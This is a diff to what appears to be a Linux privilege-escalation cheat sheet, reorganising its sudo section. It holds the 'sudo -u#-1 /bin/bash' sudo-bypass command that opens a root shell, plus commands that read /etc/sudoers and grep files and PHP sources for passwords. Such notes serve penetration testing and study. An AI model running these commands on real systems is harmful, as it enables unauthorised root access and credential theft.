@@ -1,4 +1,4 @@
-sudo -u#-1 /bin/bash
+
 
 ---------------------------------
 
@@ -139,10 +139,12 @@ https://gtfobins.github.io/
 
 # Commands:
 check to see what sudo privledges the user has
-```
+
 sudo -l
 cat /etc/sudoers
-```
+sudo -u#-1 /bin/bash
+ls -lsaht /etc/sudoers
+
 
 # other Super Users?:
 ```
@@ -171,14 +173,6 @@ grep -C 5 "password" [filename]
 ### find php file and check them for the variable $password
 ```
 find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
-```
-
-
-
-# root access:
-## list all programs this account has sudo access to
-```
-sudo -l
 ```
 
 ## find all files with SUID & SGID set
